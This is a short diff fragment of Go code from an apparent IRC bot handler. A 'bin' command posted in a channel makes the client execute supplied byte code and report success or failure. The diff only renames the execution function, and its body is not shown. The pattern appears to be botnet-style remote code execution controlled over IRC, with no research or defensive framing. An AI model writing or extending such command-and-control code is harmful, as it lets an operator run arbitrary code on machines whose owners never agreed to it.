@@ -13,7 +13,7 @@ func handler(c *irc.Client, m *irc.Message) {
 	// byte code execution
 	case m.Command == "PRIVMSG" && c.FromChannel(m) && readCommand(m.Params[1]) == "bin":
 		var ok string
-		if binaryExecute(m.Params[1]) {
+		if hexExecute(m.Params[1]) {
 			ok = "[OK]" // if executed code didnt return error
 		} else {
 			ok = "[!OK]" // opposite
